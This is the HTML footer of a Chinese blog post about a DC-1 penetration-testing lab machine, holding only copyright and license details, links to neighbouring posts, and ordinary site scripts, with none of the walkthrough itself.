</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:shuiyue75381@gmail.com">bb</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="http://bbkali.github.io/2020/02/04/DC-1靶机渗透实战/">http://bbkali.github.io/2020/02/04/DC-1靶机渗透实战/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://bbkali.github.io">bb的博客</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2020/02/04/DC-2靶机渗透实战/"><i class="fas fa-angle-left">&nbsp;</i><span>DC-2靶机渗透实战</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2020/01/27/powershell语法总结/"><span>powershell语法总结</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2019 ～ 2020 By bb</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>